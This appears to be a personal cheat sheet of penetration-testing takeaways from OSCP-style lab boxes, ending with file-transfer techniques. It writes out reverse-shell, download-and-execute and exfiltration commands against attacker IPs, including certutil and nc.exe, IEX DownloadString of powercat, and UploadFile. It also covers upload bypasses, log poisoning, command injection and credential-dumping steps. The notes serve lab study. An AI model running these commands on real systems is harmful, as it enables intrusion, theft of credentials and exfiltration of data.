## Dump of takeaways from boxes that I haven't categorized

- Jaws, privesccheck.ps1 are worth running if you're completely stuck. Jaws easily identifies whether spooler is running for potato exploits.
- When in doubt, new technology, unfamiliar port, check hack tricks. Sweetpotato & god potato.
- How to know which version of Net (for sharp collection)?
- Laps, read admin password.
- When testing for SSTI, try {{7*7}}.
- /var/tmp/payload.sh is best guess.
- Always run pspy, especially if a cronjob is running.
- Pkexec->pwnkit.
- If you see a Pyc file, especially if it is in an interesting location, decompile it and view the code.
- If your file upload attack just isn't working, check if you can upload .htaccess, find where it’s saved, and then upload webshell (AddType application/x-httpd-php .genius or .anymadeupname).
- SeManageVolumeExploit.exe.
- Check headers for windows api when you're submitting information in a form, especially a link, then set up responder and try to capture hashes when it hits your tun0.
- A reliable way to get shell on Windows is to transfer nc.exe and do a simple nc reverse shell, same as the one from hacktricks god potato.
- If you're in a Windows database server, and you're trying to communicate out, 8082 is the outbound database port, use this if transferring from database.
- Simple way to get more information about files in directory, such as who owns them: 'dir /a /o /q'
- If you see a lot of custom content on a CTF website, you should use cewl and create a custom wordlist.
- Always fuzz php parameters in browser if you get the opportunity (find S1RENs offsec walkthrough).
- Say that you're within the system, and you're trying to get in as www, you can poison the logs of /proc/self/environ, /var/log/auth.log, or access.log and then do ?&cmd=payload.
- Run ls -lsa in ftp so that you don't skip over hidden files.
- Btop is a cooler version of htop.
- Be aware that you need to use a -sT tcp connect scan to scan certain proxies.
- If you can’t ls inside of directory, try getfacl & potentially cat the files inside.
- Even if directory is 403, you can FUZZ past it. 
- nmap —script=smb-enum-shares.
- Write permissions for smb? -> upload revshell in disguise. Look for files that you know people are going to click on, ideally replacing those.
- Joomla->joom scan.
- Always look up vulnerabilities, even for seemingly homemade software (check the tab title).
- Make sure to spray usernames as passwords as well (in another cat file).
- Always check for default credentials.
- If stagless shell isn’t working, try a staged one.
- Read through the entire exploit code, there may be a little comment that means everything.
- If you’re getting a little functionality or progress with a PoC, but it doesn’t ultimately work, try another one (or two).
- If a machine is slow, revert it right away.
- Run "dig any website.offsec @IP" to query more information about the DNS server.
- When doing the "php://filter/convert.base64-encode/resource=index" thing, look for included files in the code, and then replace the value, in this case, index, to keep investigating code.
- If you're in a situation where you can upload a zip file, there's a php module where you can make the server read it, "192.168.234.229/index.php?file=zip://uploads/upload_1715711517.zip#rev" (https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------).
- If nothing is working on a file upload, you can try to overwrite their .htaccess file with your own, "AddType application/x-httpd-php .genius"
- If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem, run "impacket-secretsdump -sam SAM -system SYSTEM LOCAL".
- If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.
- If a normal bash reverse shell doesn't work in a php command, try encoding it and setting the port to 443 or 80.
- Always try password reuse, even and especially in mysql. This should be automatic. Create a script that you can run with netexec that automatically runs the gauntlet whenever you get any new creds, even if they are just prospective. Be aware of the lockout policy.
- Try to upload a malicious plugin for WordPress, or any CMS, if possible. CMSs also cry for public exploits in the CTF world.
- If you have access to the files in /var/www/html/ and there's a website that you are unable to access, whether it be on the loopback or not, configure the website code where you can login.
- Check if you have access to the webroot with SMB so you can put a web shell in there.
- Always search through history files, for kdbx, and txt files.
- Always try ftp with the username anonymous and the password anonymous.
- If you have a resolved domain, always add it to your hosts file, then test for subdomains with "gobuster dns -d relia.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30", with the weird open http port that you found (if relevant), "http://web02.relia.com:14080/".
- If one exploit isn't doing the job, check out another one, if that doesn't work, there are some great exploits that are available on GitHub through Google. Blogs that walk you through exploits are awesome and help understand the vulnerability you're facing, which helps you personalize it to your situation.
- If the executable that runs the msfvenom path doesn't work, try the other c code that creates an admin user on the system.
- Always check out exploits for Apache and the other web technologies. It's crazy how often these pop up.
- Always check for alternative file names, in the case of id_rsa, check for ".ssh/id_dsa, .ssh/id_ecdsa, .ssh/id_ed25519, .ssh/authorized_keys". Note that nmap should show you which keys they are using.
- If possible, always compile the exploit on the target machine. Only do it on your machine (in the CTF context) if you run into a gajillion issues.
- Whenever you see a question mark in the URL, think LFI, PHP wrappers, SQLi.
- If you have LFI and can already get a shell on the server, plant a reverse shell in the web root and execute it through the LFI.
- If you're stuck on a Linux system, use pspy.
- Find a way to upload document to ANY directory in the webroot, always recursively search for directories.
- Try all of the netexec enumeration commands to verify credentials, explore vectors. Create a script to do do.
- When using wget in a payload, don't do http://$ip.. leave out the 'http://'. There was a payload that didn't work when you kept the http://. Check the exploit code, I'm sure it was included already.
- If nc isn't working for a revshell, and there are common variables to what you saw with the Berlin box, aka spring boot and java, try adding "busybox" in front of the command. Revshells.com has a version.
- For port 8443, use a hostname with HTTPS instead of HTTP. (Face palm).
- Say that you upload a web or reverse shell on one port (example 8443), the method of accessing it may be through one of the other port (such as 8000). Enumerate to find place the wwwroot.
- If there is a URL input on a Windows server, try to ping your own server and capture the hash with responder.
- When there is a URL input, instead of accessing your python server, you can create an impacket smb server and get a file through that method. For some reason, this works sometimes while the python server does not.
- If you get credentials, you should always rewind and try to log in the original services that you were trying to enumerate, such as ftp where you can place a shell in the webroot. This has come up again and again.
- Assume that the name of the box is a username on the system.
- Do you need to have the id_rsa.pub in your directory? not only the private key? try pub 666 priv 600.
- If there are any weird binaries that stick out, especially if they have suids or guids set, run 'strings' against them and check whether they have any relative paths that you can hijack. you could simply modify the path (put a writable directory at the front) & put a reverse shell in the writable directory which the same name. just make sure to change the permissions to make it executable. check the dlls as well, and have pspy running while you execute it.
- Start at the smaller attack surfaces, and work your way to the larger ones if need be.
- If you can upload/overwrite files, try to add a modified /etc/passwd with you in there, whenever you can, always do "../../../../../../../../etc/passwd" to avoid risking a lot of your time.
- If anything has a password, and you can't get into it, hashcat can probably crack it.. I made this mistake with the zip file.. it's worth a search to find out if it is possible.
- Whenever you're facing an exposed .git repository, try using git-dumper to ease the process.
- Sometimes you're unable to ssh into a user with the password that you have, and instead, have to 'su username' to login as that user. Do not forget to do this.
- If something seems out of the ordinary, attack the fuck out of it. The more experience you have, the better instincts you will have.
- Always check the SAM if there's any sort of backup or loose permissions in SMB.
- Dumping secrets is mainstream knowledge, stop slackin' (C:\windows.old\windows\system32\SAM & SYSTEM>) -> "/usr/local/bin/secretsdump.py -sam SAM -system SYSTEM LOCAL".
- If you can see that your shell is not maintaining, try modifying the exploit code to suit your needs. In this case, I downloaded and ran nc.exe. "certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80" instead of typing the command as a parameter to the exploit.
- For any weird port, search up related exploit along with any fingerprint that you have to narrow down results.
- If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $ip -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
- Always search for exploits using terms as vague as possible, then narrow down afterwards, this way you don't miss something.
- If you have problems compiling an exploit on a target, try doing it on your local computer.
- If you're POSTing data for a website, try to modify the route. In this case, an exploit relied on htmLawed.php for the exploit to work, and when it tried to post there, it noticed that there was no file with this name. When I modified the route to '/', it worked.
- If you're modifying an exploit, and it's not working and you're getting a 400 error, you're not cleaning/modifying the GET/POST request correctly. Check if there are newlines where there are not supposed to be.
- Use jadx to look at interested .apk files
- Always enumerate and find unique files and their permissions, groups
- Stop forgetting to try default credentials before you try a bunch of fancy stuff
- Look at the requests and headers of interesting urls, files, directories.. sometimes you'll find interesting hashed passwords and credentials. You never know.
- If you have access to SMB shares, keep in mind that the actual server may have the same exact structure, especially if there's a backup share. Keep in mind the files where you find passwords, you may never know if you will end up crafting a file inclusion attack with their updated passwords or info.
- If your shell is immediately disconnecting, then try the rlwrap thing
- If you cannot connent to your python server, try switching the port to 80
- If you can't find the powershell command/binary, check "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe"
- Don't forget about the "echo encoded_reverse|base64 -d| bash" reverse shell
- https://www.blakejarvis.com/oscp/oscp-things-to-try-when-stuck
- Enumerate users in ldap: "ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=hutch,DC=offsec""
- If you have creds, there may be a webdav that you can access with cadaver in order to upload a web shell, "cadaver $ip". I saw that there was a webdav in my Nikto output, but didn't know how to go about solving it.
- If you're accessing internal websites on your loopback interface, don't forget to add the hostname to /etc/hosts "127.0.0.1 website.com"
- Don't listen to nxc if it says that smb, winrm, rdp, or whatever vector cannot be logged into with the creds that you have. Try it anyway. 
- If your php windows reverse shell seems to not stick, immediately disconnects, upload simple html.php, set the path, then run the nc.exe command from god potato
- If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website
- If you see something unusual, but it requires a password and it just skips over the password for whatever reason (doesn't let you input one), echo and pipe a password
- Always fucking enumerate once you get Admin. You would've failed the exam.
- Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"
- If you have a username, such as jack, also try Jack when you're logging into stuff
- It's a good idea to mimick the port # when getting a reverse shell. Mouse Server 9099 -> nc -lvnp 9099
- jaws will tell you the firewall rules, use revshells accordingly, ex: "Outbound-tcp 8080,80,88,135,139,445,53,389"
- If you don't know what a port is, google "port {port} exploit"
- When replacing a binary, make sure to transfer it directly to the location that it needs to be (or the same directory), that way it keeps the Administrator ownership
- Whenever you run into a functionality on a website such as a nslookup or ping or anything that could executing a bash/pwsh command, try to add "&&" or ";" and append your own command. It's worth pinging yourself first or wget/certutiling a file from your server first to see if you get a connection
- If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password
- If you crack a password for a zip file, keepass or something, try that with any other users in the environment
- If MySQL is running as root, try the raptor_udf.c privesc code
- If you have JWT, crack the secret of the token and modify the key in jwt.io with admin username and secret. Check for SSTI in place of username and or secret, example templates in HackTricks.
- Understand the running processes, maybe you need to do something that trigger that process that you can run to elevate your privileges, such as send an email to trigger disclaimer process.
- For Windows directory traversal, see if system is running ssh and target potential users.
- Smtp-user-enum to check for valid usernames.
- If something takes parameters, see what happens if you put an illegal parameter.. you’ll often get more information.
- New nc can’t you -e flag for reverse, but nc.traditional can. If you see something running on local server, curl it.
- Check out phpinfo for potential users
- If you find a directory traversal vulnerability in the format of '?page=', try inserting a url to your own server with an exploit. I got this hint by looking in "..\..\..\..\..\..\..\xampp/apache/logs/access.log" and seeing the person setting up the lab test this with their own exploit.
- If you run into a "Cannot "GET" /dir ", try doing a "POST" instead:, "curl -X POST http://192.168.179.99:33333/list-running-procs -H 'Content-Length: 0'"
- If a password looks weird and it doesn't work, it may be base64!!!!!!!! It's happened fucking twice noww.
- Whenever you get some evidence, it's pretty fucking likely that it's important.. find a way where it could apply.. what are you not seeing ?
- Search "confluence 7.13.6 exploit github" format for finding poc's.. blogs are great too if you've exhausted your options.. after that, consider manually modifying exploits
- If you're stuck, you have some information about a webapp or wordpress and you can't find it with gobuster, try checking out the same of the box/webapp manually as a directory
- For Wordpress, you can upload malicious plugin or simply edit an existing page (theme editor) and insert a webshell
- If anything is interesting, take fucking notes!
- Make it a MUST to check web config file once you get onto the box. There may need to be local port forwarding, or certain vhosts or passwords that you weren't aware of.
- Whenever a reverse shell isn't working as planned, test it on your own and make sure that it works
- If you can run a command as sudo, and that command brings you into an editor, try to do the "!/bin/bash" thing to escape the man/editor/nano/whatever and go into a root shell
- If there's a weird executable that you run, and it's connecting somewhere or in their domain, see what's going on in WireShark.. there may be a password that you can find through the raw packets, such as ldap
- If the end of the ObjectID for a group in AD is above 1000, it is not a default group and is worth paying extra attention to.
- Take the time to read the exploits you're using, in my current box, it noted that the php is uploaded even if it says it wasn't.. I don't know how I could've figured this out without reading
- Check nmap http/s output to see if there is a vhost listed
- Go through WinPEAS SLOWLYYYYY.. you just fucking missed another check for Windows Credentials stored in Firewox browser
- Enumerate the local sql database if any signs lead towards it
- Fully enumerate CMS, checking and clicking on any links about users or anything that would be of value to know more of
- If nothing's coming up, try using combined-directories with a different dirbuster tool
- Always collect NTLM hashes, there are times where PTH will work while a password won't
- When you're using BloodHound, add groups that you're in as owned. It'll unlock more avenues. Do some manual research as to what nested groups you are in (MemberOf), and go for WriteDacl if given an option. Go to group membership node info on BloodHound to do
- If there's an url input box or something, query both the localhost 127.0.0.1 and yourself.. intercept and test what it does. In this base, I found an extra directory that I didn't uncover with fuzzing. You could also upload something and trigger it by putting the url as the localhost directed at the reverse file in th e appropriate directory. Maybe find what it returns when you put the localhost and then traverse directories from there. You could also save the request as a file and fuzz for directories from there with ffuf, or fuzz for ports.
- Reset the machines after your scan, even scanning nmap twice as it'll miss sometimesUsername:
- Check for software and version numbers in exiftool
- If you start seeing sqli error stuff, start intercepting requests and seeing if parameters are defined in the response. Also, look for sqli on the web for the software version.
- Make sure your slashes ('/', '\') are right when you're running commands, especially impacket
- When echo -n "hash" | base64 -d doesn't work, try adding | xxd at the end
- If password is encrypted, look up the encrypted used by the service,company,file type that you found it in, such as VNC
- What's unique to your user.. there is often a story that's being played.. the person creating the machines wants to express themselves
- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../"
- This resource has good ways to escalate privs on linux with a single command, "https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/"
- If you're pentesting webapp, look at the names of the cookies, if you don't know what it is, look into it and get a better understanding of the software and vulnerabilities on the backend
- If you have a supposed password and its not working, try best64 rules, i was just stuck on one where there was an extra letter at the end of the password.. it something is out of the norm, don't take it for granted, in this case, the password i knew existed was changeme but it came out as changeme1 when i decrypted the sql hash
- When searching through a lot of files for a secret or password, be aware of the language that the files are. If they're in php, you'll save some time and find more secrets if you search for '=>', ''password' => 'Playing-Unstylish7-Provided','user' => 'admin', 'name' => 'boxbilling', array ('
- If there's a file that is the center of attention, and you can't seem to find out anything about it, do the traditional "/bin/file --help" or "man file"
- Note that you can bypass uploads with .htaccess file
- If you're trying to get more information and cant find phpinfo, try /?phpinfo=1
- You can proxy through your browser with foxy proxy
- Port 135 allows egress traffic (Windows) for rpc
- LFI ssh key doesn't work ? -> scp doesn't work ? -> ssh dynamic port forward 
- If you're in evil-winrm and you don't like it, just execute a reverse shell, really useful when trying to run mimikatz and other cool stuff
- If pip isn't working for something that you need, create a virtual environment 'python -m venv venv;chmod +x venv/bin/activate;source venv/bin/activate', then 'pip uninstall {all requirements for the thing that you need', and then reinstall them
- When you get those weird errors from gobuster,wfuzz,... about EOF or not being able to connect, but you can in your browser, there's a proxy in play. Maybe CSRF
- Look for .rdp files !
- Make a point to enumerate all of the services that are available on the machine, looking CAREFULLY
- Your /etc/hosts file can be everything when it comes to the website. It's best to try all of the different combinations. Base the domain off of an email if you have one
- Collect as much as humanely possible and grep through it constantly for centering
- Try another wordlist besides rockyou if it doesn't work
- Take a step back every two hours, no typing, only review the information that you have so far. Reground yourself
- If you have local admin on an AD set, create backdoor user and get an RDP session going
- Try to modify the authorized_keys files if you can, "scp -i id_rsa -O authorized_keys max@sorcerer:/home/max/.ssh/authorized_keys"
- If nothing of the exploits are working, and in this case had very similar issues, zoom out your search, 'teamcity exploit github' instead of 'teamcity version x.x.x exploit'.. there may be newer ones
- If ssh isn't working, you may need to crack the id_rsa password, even if there isn't the usual message. Make sure that the spelling is correct. 600.
- Get used to fuzzing with nothing
- Use replace feature in Burp if you need to take over a cookie, use regex .* to pattern match
- Before you spend a million hours on something that is unresolving, step back and explore other options
- Search port 17001 exploit
- See if there is a suggested rev/bind shell for the exploit that you're using.. that's probably a good way to go
- Test the name of the application, host, box name, etc., in this case, "http://192.168.154.117:18000/Protomba"
- Revshell with webapp lang, and if it doesn't stick, switch bash to sh
- Go exploits have been really reliable, especially for port 25
- Look at the source code for everything
- Fucking try su name with the password being name
- If you can run a python file as sudo, and a module isn't importing or loading, place a simple python file with that module's name in the directory that executes bash
- whenever there is a filemanager, check the version and be sus as fuck, even if its within another app that has a million exploits
- Manually inputting exploit in url fixed issue, great way to trouble any exploit issues
- Understand the concept of placing files in smb directory that you cant view otherwise, such as php source on web, I could copy internal files but couldn't get contents from website (cant view php), but could in smb
- Fucking try to login with user:user as creds on all possible surface
- Whenever you have LFI for initial access (or not), know that you can pivot laterally to whoever is running the webserver once youre on the machine, poison any file in a directory that you can write to
- Troubleshooting the 'find' SUID privesc, because it runs the -exec parameter the n=(number of files in pwd) times, make a new directory and run the command in there
- If it's a ruby application, you can find the web root from action controller via entering at invalid route or triggering routing error, and in the context of OffSec, don't go down Ruby exploit rabbitholes
- If all or most of the exploits are pointing to having credentials, exhaust the other options, then brute force, both with all clues that you've gotten and with cewl
- Be very aware whether you are in a powershell or cmd, and whether the command you're running is native to your shell. Many cmd.exe commands will not run when you enter them in, what's worse is it'll be without any message letting you know
- You can test if you made silver ticket, kerberos ticket, ccache, klist, whatever, by running a kerberoasting tool such as rubeus and seeing if there are errors and everything looks gucci
- Snaffler.exe is great tool that exposes relavent paths, not many rabbit-holes, should use
- When you're using chisel and ligolo make sure to fucking use the right port, likely there's is yours and yours is theres (that'll get ya thinking at least). Put the localhost for the ip on the victim/client machine ".\chisel.exe client 192.168.45.221:80 R:1433:127.0.0.1:1433"
- Note that if dumping the hashes in the sam and system isn't fruitful (hashes dont work), then create a shadow copy and extract the ntds.dit
- STATUS_NOT_SUPPORTED = no ntlm 
- If jenkins is running, test with all credentials that you have
- use c:/windows/system32/drivers/etc/hosts to check for lfi on windows
- fuzz past aspnet_client/system_web/
- BloodHound all collection doesn't include GPOLocalGroup by default
- BloodHound custom queries are a must
- If net rpc commands aren't working, try doing the commands by connecting with rpcclient
- Reset the box if something isn't working that should
- YOU MUST TRY TO OPEN POWERSHELL AS ADMIN. JUST TRY IT.
- Read any error messages as if nothing else matters. Don't go anywhere.
- AV will delete the malicious files in your share given the chance
- Write report with "https://docs.sysreptor.com/oscp-reporting-tools/"
- Combine wordlists, separate lower, 202x
- namemash.py
- When testing for ssti, nothing worked if i did `3*3 {3*4} {{3*5}}` but it worked when I just did `3*3`
 












Nothing is 100% bullet-proof. This is why I have several options to accomplish this.
1- As already mentioned, impacket-smbserver -smb2support test . is gold.
2- python -m pyftpdlib -w will spawn a ftp server on you kali. use the ftp command on windows to transfer the file(s).
3- On Kali: nc -lvp 4444 > TransferedFile on Windows: nc.exe <kali_ip> 4444 -w 5 < FileToTransfer
4- Using powercat + powershell. Host powercat.ps1(link: https://github.com/besimorhino/powercat/blob/master/powercat.ps1) in a webserver on the attacker machine. Execute powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://kali-ip/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoTransfer" On kali: wget http://windows-ip:4444/FileToTransfer
5- Host the below php on a php-enabled webserver on kali:

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Use a webbrowser on the victim to access the page and upload the desired file or use the below powershell to accomplish the same:

powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
